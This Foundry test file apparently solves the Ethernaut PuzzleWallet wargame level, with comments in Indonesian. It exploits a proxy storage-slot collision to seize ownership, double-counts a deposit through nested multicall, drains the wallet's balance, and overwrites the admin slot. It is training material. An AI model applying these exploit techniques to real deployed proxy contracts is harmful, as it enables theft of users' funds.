// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "src/levels/PuzzleWallet.sol";
import {PuzzleWalletFactory} from "src/levels/PuzzleWalletFactory.sol";

contract PuzzleWalletSolve is Test {
    PuzzleWalletFactory factory;
    PuzzleWallet instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new PuzzleWalletFactory();
        vm.deal(player, 10 ether);
        vm.deal(address(this), 10 ether);
        instance = PuzzleWallet(payable(factory.createInstance{value: 0.001 ether}(player)));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // (1) proposeNewAdmin menulis slot 0 proxy (= owner di layout wallet)
        // -> jadi owner wallet.
        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);
        // (2) sebagai owner, whitelist diri sendiri.
        instance.addToWhitelist(player);
        // (3) multicall bersarang: deposit() dieksekusi 2x dengan msg.value
        // yang sama (0.001 ether) — guard depositCalled hanya berlaku per
        // frame multicall, dan delegatecall mempertahankan msg.value.
        // balances[player] = 0.002 ether, saldo wallet = 0.002 ether.
        bytes[] memory inner = new bytes[](1);
        inner[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, inner);
        instance.multicall{value: 0.001 ether}(data);
        assertEq(instance.balances(player), 0.002 ether);
        // (4) kuras seluruh saldo wallet (0.002 ether) -> balance == 0.
        instance.execute(player, 0.002 ether, "");
        // (5) setMaxBalance = alamat player sebagai uint256 -> slot 1 proxy
        // (= admin) menjadi player.
        instance.setMaxBalance(uint256(uint160(player)));
        vm.stopPrank();
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
